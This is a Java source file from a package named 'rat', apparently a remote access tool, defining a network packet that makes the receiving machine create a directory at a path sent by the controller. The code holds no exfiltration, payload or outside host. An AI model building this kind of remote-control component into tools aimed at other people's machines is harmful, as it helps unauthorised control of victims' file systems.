package de.sogomn.rat.packet;

import java.io.File;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveConnection;

public final class NewDirectoryPacket implements IPacket {
	
	private String directoryPath, name;
	
	private static final String SEPARATOR_REGEX = "[\\\\\\/]";
	private static final String SEPARATOR = "/";
	
	public NewDirectoryPacket(final String path, final String name) {
		this.directoryPath = path.replaceAll(SEPARATOR_REGEX, SEPARATOR);
		this.name = name;
	}
	
	public NewDirectoryPacket() {
		this("", "");
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeUTF(directoryPath);
		connection.writeUTF(name);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		directoryPath = connection.readUTF();
		name = connection.readUTF();
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		final File directory = new File(directoryPath);
		
		String directoryPath = null;
		
		if (directory.isDirectory()) {
			directoryPath = this.directoryPath;
		} else {
			final File parent = directory.getParentFile();
			
			if (parent != null) {
				directoryPath = parent.getAbsolutePath();
			}
		}
		
		if (directoryPath != null) {
			final String path = directoryPath + File.separator + name;
			
			FileUtils.createFolder(path);
		}
	}
	
	public String getPath() {
		return directoryPath;
	}
	
	public String getName() {
		return name;
	}
	
}
